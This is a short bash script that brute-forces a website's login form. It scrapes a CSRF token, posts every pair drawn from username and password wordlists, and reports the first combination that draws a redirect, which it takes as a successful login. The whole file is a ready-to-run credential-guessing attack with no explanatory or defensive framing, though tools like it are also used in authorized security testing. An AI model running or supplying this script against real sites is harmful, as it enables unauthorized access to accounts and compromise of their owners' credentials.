#!/bin/bash

test-credentials() {
    local username="$1"
    local password="$2"
    local host="$3"

    #get token
    curl -c cookies.txt -s "${host}/login" -o login.html
    CSRF_TOKEN=$(grep 'csrf_token' login.html | awk -F"value='" '{print $2}' | awk -F"'" '{print $1}')


    HTTP_CODE=$(curl -b cookies.txt -s -o /dev/null -w "%{http_code}\n" "${host}/login" \
      -X POST \
      -H "Origin: ${host}" \
      -H "Referer: ${host}/login" \
      --data-raw "username=${username}&csrf_token=${CSRF_TOKEN}&password=${password}")

    if [ "${HTTP_CODE}" -eq 302 ]; then
        echo "${username}:${password}"
    fi
}

# ------------- MAIN ------------- #
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <host>"
    exit 1
fi  


HOST="$1"
SECONDS=0

while IFS= read -r USERNAME || [[ -n "$USERNAME" ]]; do
    while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
        printf "testing ${USERNAME}:${PASSWORD} on ${HOST}\n"
        RESULT=$(test-credentials "${USERNAME}" "${PASSWORD}" "${HOST}")
        if [[ -n "$RESULT" ]]; then
            printf "+ RESULT: ${RESULT} on ${HOST} found in ${SECONDS}s\n"
            exit 0
        fi
    done < passwords.txt
done < usernames.txt
printf "+ \"RESULT: No match was found. Searched took ${SECONDS}s\"\n"
exit 0
